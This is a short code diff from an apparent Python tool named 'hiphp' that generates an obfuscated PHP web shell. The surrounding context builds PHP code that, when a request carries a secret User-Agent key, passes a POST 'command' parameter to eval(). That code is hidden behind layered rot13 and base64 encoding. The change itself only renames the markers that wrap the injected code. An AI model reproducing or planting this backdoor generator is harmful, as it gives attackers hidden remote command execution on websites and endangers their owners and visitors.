@@ -367,8 +367,8 @@ class hiphp:
         code="if($_SERVER['HTTP_USER_AGENT']=='"+self.key+"'){echo'#"+self.key+"';if(isset($_POST['command'])){eval($_POST['command']);}exit;}"
         code=rot13(tobase64(rot13(tobase64(rot13(code)))))
         code=f"eval(str_rot13(base64_decode(str_rot13(base64_decode(str_rot13('{code}'))))));"
-        php_s="/*php code start*/"
-        php_e="/*php code end*/"
+        php_s="/*HIPHP_HOLE_CODE START*/"
+        php_e="/*HIPHP_HOLE_CODE END*/"
 
         if self.retu==True and get==False:
             return php_s+"\n"+code+"\n"+php_e
